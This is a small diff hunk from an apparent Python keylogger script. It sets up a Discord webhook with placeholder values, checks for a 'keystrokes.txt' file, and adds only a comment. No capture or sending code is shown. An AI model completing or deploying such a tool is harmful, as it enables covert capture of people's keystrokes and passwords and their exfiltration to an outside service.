@@ -8,6 +8,7 @@ from discord_webhook import DiscordWebhook
 
 webhook = DiscordWebhook(url='#discord_webhook_url', username="#bot_name")
 
+#file creation and check
 check_file = os.path.isfile('keystrokes.txt')
 
 for i in range(1):
